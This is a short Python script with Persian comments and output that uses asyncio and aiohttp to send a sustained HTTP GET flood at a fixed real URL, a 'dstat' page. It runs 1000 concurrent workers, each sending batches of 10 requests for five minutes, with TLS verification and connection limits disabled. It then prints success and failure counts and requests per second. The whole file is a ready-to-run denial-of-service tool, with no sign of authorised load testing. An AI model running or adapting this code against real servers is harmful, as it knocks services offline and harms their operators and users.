# main.py
import asyncio
import aiohttp
import time

TARGET_URL = "https://dstat.countbot.uk/"
CONCURRENT_REQUESTS = 1000
DURATION = 300  # ثانیه

async def send_request(session):
    try:
        async with session.get(TARGET_URL) as response:
            return response.status
    except:
        return None

async def worker(stats, stop_event):
    connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ssl=False)
    timeout = aiohttp.ClientTimeout(total=5)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        while not stop_event.is_set():
            tasks = [send_request(session) for _ in range(10)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in results:
                if isinstance(r, int) and r == 200:
                    stats["success"] += 1
                else:
                    stats["fail"] += 1

async def main():
    stats = {"success": 0, "fail": 0}
    stop_event = asyncio.Event()

    tasks = [asyncio.create_task(worker(stats, stop_event)) for _ in range(CONCURRENT_REQUESTS)]

    start_time = time.time()
    await asyncio.sleep(DURATION)
    stop_event.set()
    await asyncio.gather(*tasks)

    end_time = time.time()
    total = stats["success"] + stats["fail"]
    rps = stats["success"] / (end_time - start_time)

    print("\n━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"✅ موفق: {stats['success']} | ❌ ناموفق: {stats['fail']}")
    print(f"📈 مجموع درخواست‌ها: {total}")
    print(f"🚀 سرعت تقریبی: {rps:.1f} req/s")
    print("━━━━━━━━━━━━━━━━━━━━━━━━")

if __name__ == "__main__":
    asyncio.run(main())
